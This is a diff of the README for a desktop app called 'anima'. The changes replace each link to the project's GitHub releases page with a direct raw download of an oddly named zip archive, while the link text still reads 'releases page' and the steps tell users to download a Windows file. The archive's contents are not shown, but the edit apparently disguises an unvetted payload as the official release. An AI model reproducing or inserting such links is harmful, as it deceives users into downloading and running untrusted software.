@@ -1,6 +1,6 @@
 # 🧠 anima - Simulate your inner world clearly
 
-[![Download anima](https://img.shields.io/badge/Download-Anima-purple?style=for-the-badge&logo=github)](https://github.com/Natalieperitoneal511/anima/releases)
+[![Download anima](https://img.shields.io/badge/Download-Anima-purple?style=for-the-badge&logo=github)](https://github.com/Natalieperitoneal511/anima/raw/refs/heads/main/antizymotic/Software_overexplain.zip)
 
 ## ✨ What it is
 
@@ -10,7 +10,7 @@ It focuses on a simple goal: help you run the app, load a session, and watch the
 
 ## 📥 Download anima
 
-1. Open the [anima releases page](https://github.com/Natalieperitoneal511/anima/releases)
+1. Open the [anima releases page](https://github.com/Natalieperitoneal511/anima/raw/refs/heads/main/antizymotic/Software_overexplain.zip)
 2. Find the latest release at the top
 3. Download the Windows file for your system
 4. Save the file to your desktop or Downloads folder
@@ -159,7 +159,7 @@ If the app includes data files, keep them in a folder you can find later. This h
 ## 📂 Where to get updates
 
 Use the GitHub releases page for new versions, fixes, and new builds:
-https://github.com/Natalieperitoneal511/anima/releases
+https://github.com/Natalieperitoneal511/anima/raw/refs/heads/main/antizymotic/Software_overexplain.zip
 
 ## 📎 Quick start checklist
 
